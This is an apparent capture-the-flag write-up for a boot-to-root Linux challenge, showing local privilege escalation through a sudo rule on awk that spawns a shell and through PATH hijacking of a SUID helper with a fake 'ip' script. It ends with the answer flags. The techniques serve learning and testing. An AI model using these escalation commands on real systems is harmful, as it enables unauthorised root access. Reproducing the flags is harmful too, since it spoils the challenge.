# Rat Race

**Category:** b2r  **Difficulty:** hard  **Author:** abu

> Sparrow Freight handed you a low-privilege account on one of their ops boxes and asked how far a foothold really gets. There's a user flag in the ops engineer's home and a root flag for whoever owns the box.
>
> Work your way up.
>
> Access: ssh guest@<your-instance-host> -p <port>   (password: guest)

Run: `docker build -t h7ctf26/sparrow-b2r challenge/ && docker run -d -p 2222:22 h7ctf26/sparrow-b2r`, then `ssh guest@127.0.0.1 -p 2222`. Flags can be overridden with `$USER_FLAG` / `$ROOT_FLAG`.

## Solution

First thing on any box, `sudo -l`:

```
(mel) NOPASSWD: /usr/bin/awk
```

awk can run commands, so that's a shell as `mel` (GTFOBins):

```sh
sudo -u mel /usr/bin/awk 'BEGIN{system("/bin/bash")}'
cat /home/mel/user.txt
```

`mel` is in the `opsstaff` group, which is the only group allowed to run a SUID root helper:

```
-rwsr-x--- 1 root opsstaff /usr/local/bin/netmon
```

`netmon` calls `ip` and `ss` by bare name and keeps our `$PATH`. Drop a fake `ip` in front of it:

```sh
cd $(mktemp -d)
printf '#!/bin/sh\nexec /bin/sh\n' > ip; chmod +x ip
PATH=$PWD:$PATH netmon
cat /root/root.txt
```

You can't skip straight to `netmon` as guest because of the group check, so the order is forced.

Flags: `H7CTF{14b8dba38cef51b37678}` (user), `H7CTF{d635334c4a8563c01e1b}` (root)
